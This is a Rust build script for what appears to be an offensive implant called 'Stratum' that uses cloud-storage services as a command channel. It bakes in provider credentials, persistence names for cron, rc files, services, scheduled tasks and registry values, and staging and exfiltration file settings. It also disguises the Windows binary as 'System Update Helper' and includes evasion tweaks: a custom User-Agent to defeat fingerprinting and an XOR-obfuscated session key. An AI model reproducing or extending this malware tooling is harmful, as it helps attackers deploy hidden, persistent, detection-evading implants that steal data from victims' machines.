// Mode- and provider-aware build script.
// STRATUM_DEPLOY_MODE  → staged-enc / stageless-enc / stageless-plain
// STRATUM_PROVIDER     → dropbox (default) / onedrive / s3 / sharepoint / googledrive
fn main() {
    println!("cargo::rustc-check-cfg=cfg(stratum_staged_enc)");
    println!("cargo::rustc-check-cfg=cfg(stratum_stageless_enc)");
    println!("cargo::rustc-check-cfg=cfg(stratum_debug)");
    println!("cargo::rustc-check-cfg=cfg(stratum_provider_onedrive)");
    println!("cargo::rustc-check-cfg=cfg(stratum_provider_s3)");
    println!("cargo::rustc-check-cfg=cfg(stratum_provider_sharepoint)");
    println!("cargo::rustc-check-cfg=cfg(stratum_provider_googledrive)");
    println!("cargo::rustc-check-cfg=cfg(stratum_p2p)");

    println!("cargo:rerun-if-env-changed=STRATUM_DEBUG");
    if std::env::var("STRATUM_DEBUG").as_deref() == Ok("true") {
        println!("cargo:rustc-cfg=stratum_debug");
    }

    // ── P2P child mode ───────────────────────────────────────────────────────
    println!("cargo:rerun-if-env-changed=STRATUM_P2P_MODE");
    if std::env::var("STRATUM_P2P_MODE").as_deref() == Ok("true") {
        println!("cargo:rustc-cfg=stratum_p2p");
        for var in &[
            "STRATUM_P2P_BIND_ADDR",
            "STRATUM_P2P_BIND_TYPE",
            "STRATUM_P2P_GUID",
            "STRATUM_STUN_IP",
        ] { bake_required(var); }
    }

    if std::env::var("CARGO_CFG_TARGET_OS").as_deref() == Ok("windows") {
        let mut res = winres::WindowsResource::new();
        res.set("FileDescription",  "System Update Helper");
        res.set("ProductName",      "System Update Helper");
        res.set("CompanyName",      "System Services");
        res.set("LegalCopyright",   "Copyright \u{00a9} System Services");
        res.set("FileVersion",      "3.0.1.0");
        res.set("ProductVersion",   "3.0.1.0");
        res.set_version_info(winres::VersionInfo::FILEVERSION,    0x0003_0000_0001_0000);
        res.set_version_info(winres::VersionInfo::PRODUCTVERSION, 0x0003_0000_0001_0000);
        let _ = res.compile();
    }

    // ── provider selection ────────────────────────────────────────────────────
    println!("cargo:rerun-if-env-changed=STRATUM_PROVIDER");
    let provider = std::env::var("STRATUM_PROVIDER")
        .unwrap_or_else(|_| "dropbox".to_string());

    match provider.as_str() {
        "s3" => {
            println!("cargo:rustc-cfg=stratum_provider_s3");
            for var in &[
                "STRATUM_ACCESS_KEY_ID",
                "STRATUM_SECRET_ACCESS_KEY",
                "STRATUM_S3_REGION",
                "STRATUM_S3_BUCKET",
            ] { bake_required(var); }
        }
        "onedrive" => {
            println!("cargo:rustc-cfg=stratum_provider_onedrive");
            for var in &[
                "STRATUM_APP_KEY",
                "STRATUM_APP_SECRET",
                "STRATUM_TENANT_ID",
                "STRATUM_REFRESH_TOKEN",
            ] { bake_required(var); }
        }
        "sharepoint" => {
            println!("cargo:rustc-cfg=stratum_provider_sharepoint");
            for var in &[
                "STRATUM_APP_KEY",
                "STRATUM_APP_SECRET",
                "STRATUM_TENANT_ID",
                "STRATUM_REFRESH_TOKEN",
                "STRATUM_SITE_ID",
            ] { bake_required(var); }
        }
        "googledrive" => {
            println!("cargo:rustc-cfg=stratum_provider_googledrive");
            for var in &[
                "STRATUM_APP_KEY",
                "STRATUM_APP_SECRET",
                "STRATUM_REFRESH_TOKEN",
                "STRATUM_FOLDER_ID",
            ] { bake_required(var); }
        }
        _ => {
            // dropbox (default)
            for var in &[
                "STRATUM_APP_KEY",
                "STRATUM_APP_SECRET",
                "STRATUM_REFRESH_TOKEN",
            ] { bake_required(var); }
        }
    }

    // Timing vars — required for all modes and providers.
    for var in &["STRATUM_WINDOW_START", "STRATUM_WINDOW_END"] {
        bake_required(var);
    }

    // HTTP User-Agent (HIGH-4) — per-deployment to break reqwest/0.12 fingerprint.
    bake_required("STRATUM_UA");

    // Staging file prefix (HIGH-12) — per-deployment to avoid predictable exfil_*/ul_* names.
    bake_required("STRATUM_STAGING_PREFIX");

    // Blob paths — optional (may be empty) but always present so all modes can
    // reference the local-cache path without extra branching in the wizard.
    bake_optional("STRATUM_BLOB_PATH_LINUX");
    bake_optional("STRATUM_BLOB_PATH_WIN");

    // Kill date — optional guardrail (YYYY-MM-DD). Empty string = no kill date.
    bake_optional("STRATUM_KILL_DATE");

    // Per-deployment persistence identity strings (CRIT-1 / CRIT-2).
    // Required for all modes — persist.rs uses env!() which is compile-time.
    for var in &[
        "STRATUM_PERSIST_SUFFIX",
        "STRATUM_PERSIST_PAYLOAD",
        "STRATUM_PERSIST_SVC",
        "STRATUM_CRON_COMMENT",
        "STRATUM_RC_COMMENT",
    ] { bake_required(var); }

    // Windows-only persist identity (CRIT-2) — only required when building for Windows.
    if std::env::var("CARGO_CFG_TARGET_OS").as_deref() == Ok("windows") {
        for var in &["STRATUM_TASK_NAME", "STRATUM_REG_VALUE"] {
            bake_required(var);
        }
    } else {
        // Bake empty strings so env!() in #[cfg(windows)] blocks never executes on
        // non-Windows builds (the cfg gate prevents it, but keep rustc happy).
        for var in &["STRATUM_TASK_NAME", "STRATUM_REG_VALUE"] {
            bake_optional(var);
        }
    }

    // ── deploy mode ───────────────────────────────────────────────────────────
    println!("cargo:rerun-if-env-changed=STRATUM_DEPLOY_MODE");
    let mode = std::env::var("STRATUM_DEPLOY_MODE")
        .unwrap_or_else(|_| "stageless-plain".to_string());

    match mode.as_str() {
        "staged-enc" => {
            println!("cargo:rustc-cfg=stratum_staged_enc");
            for var in &[
                "STRATUM_STUB_SECRET",
                "STRATUM_SALT",
                "STRATUM_S2_PATH_LINUX",
                "STRATUM_S2_PATH_WIN",
            ] { bake_required(var); }
        }
        "stageless-enc" => {
            println!("cargo:rustc-cfg=stratum_stageless_enc");
            for var in &[
                "STRATUM_STUB_SECRET",
                "STRATUM_SALT",
                "STRATUM_ENCRYPTED_CONFIG",
            ] { bake_required(var); }
        }
        _ => {
            // stageless-plain — full self-contained agent
            for var in &[
                "STRATUM_FOLDER_PATH",
                "STRATUM_INPUT_FILE",
                "STRATUM_OUTPUT_FILE",
                "STRATUM_HEARTBEAT_FILE",
                "STRATUM_BASE_SLEEP",
                "STRATUM_JITTER",
                "STRATUM_PUBLIC_KEY_B64",
                "STRATUM_STUN_IP",
            ] { bake_required(var); }
            // SESSION_KEY is XOR-obfuscated at compile time (HIGH-11):
            // STRATUM_SESSION_KEY_XOR = hex(session_key ^ mask), STRATUM_XOR_MASK = hex(mask).
            // Prevents the raw hex key from appearing verbatim in .rodata.
            bake_session_key_xor();
            bake_required("STRATUM_PREKEY_POOL_B64");
        }
    }
}

fn bake_required(var: &str) {
    println!("cargo:rerun-if-env-changed={}", var);
    let val = std::env::var(var)
        .unwrap_or_else(|_| panic!("Required build variable not set: {}", var));
    println!("cargo:rustc-env={}={}", var, val);
}

fn bake_optional(var: &str) {
    println!("cargo:rerun-if-env-changed={}", var);
    let val = std::env::var(var).unwrap_or_default();
    println!("cargo:rustc-env={}={}", var, val);
}

fn bake_session_key_xor() {
    println!("cargo:rerun-if-env-changed=STRATUM_SESSION_KEY");
    println!("cargo:rerun-if-env-changed=STRATUM_XOR_MASK");
    let key_hex = std::env::var("STRATUM_SESSION_KEY")
        .unwrap_or_else(|_| panic!("Required build variable not set: STRATUM_SESSION_KEY"));
    let key_bytes = (0..key_hex.len())
        .step_by(2)
        .map(|i| u8::from_str_radix(&key_hex[i..i+2], 16)
            .unwrap_or_else(|_| panic!("STRATUM_SESSION_KEY is not valid hex")))
        .collect::<Vec<u8>>();
    if key_bytes.len() != 32 {
        panic!("STRATUM_SESSION_KEY must be 64 hex chars (32 bytes), got {}", key_bytes.len());
    }
    // Generate or read mask; allow overriding for reproducible builds.
    let mask_hex = std::env::var("STRATUM_XOR_MASK").unwrap_or_else(|_| {
        // Derive mask from first 32 bytes of STRATUM_PERSIST_SVC + counter — deterministic per deploy.
        // Simpler: generate 32 pseudo-random bytes from mixing deploy vars.
        let seed = std::env::var("STRATUM_PERSIST_SVC").unwrap_or_default();
        let mut mask = [0u8; 32];
        for (i, b) in mask.iter_mut().enumerate() {
            *b = seed.as_bytes().get(i % seed.len().max(1)).copied().unwrap_or(0xA5)
                ^ (i as u8).wrapping_mul(0x6D).wrapping_add(0x4B);
        }
        mask.iter().map(|b| format!("{:02x}", b)).collect()
    });
    let mask_bytes = (0..mask_hex.len())
        .step_by(2)
        .map(|i| u8::from_str_radix(&mask_hex[i..i+2], 16).unwrap_or(0xA5))
        .collect::<Vec<u8>>();
    let xored: Vec<u8> = key_bytes.iter().zip(mask_bytes.iter()).map(|(k, m)| k ^ m).collect();
    let xored_hex: String = xored.iter().map(|b| format!("{:02x}", b)).collect();
    println!("cargo:rustc-env=STRATUM_SESSION_KEY_XOR={}", xored_hex);
    println!("cargo:rustc-env=STRATUM_XOR_MASK={}", mask_hex);
}
